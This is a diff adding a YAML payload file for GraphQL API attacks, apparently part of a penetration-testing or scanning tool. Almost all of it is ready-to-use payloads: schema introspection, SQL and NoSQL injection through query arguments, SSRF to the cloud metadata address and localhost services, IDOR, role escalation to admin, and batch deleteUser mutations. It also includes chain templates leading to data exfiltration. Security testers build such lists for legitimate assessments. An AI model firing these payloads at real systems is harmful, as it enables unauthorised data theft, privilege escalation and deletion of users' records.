@@ -1,0 +1,75 @@
+name: GraphQL Injection
+description: GraphQL API vulnerabilities - injection, introspection abuse, batching
+  attacks.
+basic_payloads:
+- '{__typename}'
+- query{__schema{types{name}}}
+- '{"query":"query{__typename}"}'
+- query{user(id:1){id,name,email}}
+- mutation{login(username:"admin",password:"test"){token}}
+bypass_techniques:
+- name: Introspection Query
+  description: Extract full GraphQL schema
+  payloads:
+  - '{"query":"query{__schema{types{name,fields{name,type{name}}}}}"}'
+  - query IntrospectionQuery { __schema { types { name } } }
+- name: Alias-Based Batching
+  description: Use aliases to perform batching attacks
+  payloads:
+  - query{user1:user(id:1){email} user2:user(id:2){email}}
+- name: Deep Recursion
+  description: Exploit depth limits
+  payloads:
+  - query{user{posts{author{posts{author{id}}}}}}
+- name: SQL Injection via GraphQL
+  description: Inject SQL through GraphQL args
+  payloads:
+  - query{user(id:"1 OR 1=1"){name}}
+  - query{search(q:"1 UNION SELECT"){results}}
+  - mutation{login(username:"admin --",password:"x"){token}}
+- name: NoSQL Injection via GraphQL
+  description: Inject NoSQL through GraphQL args
+  payloads:
+  - '{"query":"query{user(id:{\"$gt\":\"\"}){name}}"}'
+  - mutation{login(username:{ne:""},password:{ne:""}){token}}
+- name: SSRF via GraphQL
+  description: SSRF through GraphQL
+  payloads:
+  - mutation{importData(url:"http://169.254.169.254/latest/meta-data/"){status}}
+  - query{fetch(url:"http://127.0.0.1:9200"){result}}
+- name: IDOR via GraphQL
+  description: IDOR through GraphQL queries
+  payloads:
+  - query{user(id:1){email} user(id:2){email}}
+- name: Mutation Abuse
+  description: Abuse mutations for privilege escalation
+  payloads:
+  - mutation{updateUser(id:1,role:"admin"){id,role}}
+  - mutation{deleteUser(id:1)}
+- name: Argument Injection
+  description: Inject into non-query arguments
+  payloads:
+  - query{user(id:"1"){name(password:"test")}}
+  - query{search(query:"*",limit:-1){results}}
+- name: Batch Mutation
+  description: Multiple mutations in one request
+  payloads:
+  - mutation{a:deleteUser(id:1){id} b:deleteUser(id:2){id}}
+detection_patterns:
+- graphql
+- '"query"'
+- __typename
+- __schema
+- graphiql
+- /graphql
+chain_templates:
+- name: GraphQL Introspection -> Data Exfil
+  description: Extract schema then query sensitive data
+  requirements:
+  - graphql_endpoint
+  - introspection_enabled
+- name: GraphQL Batching -> IDOR
+  description: Batch query user IDs for IDOR
+  requirements:
+  - graphql_endpoint
+  - user_query
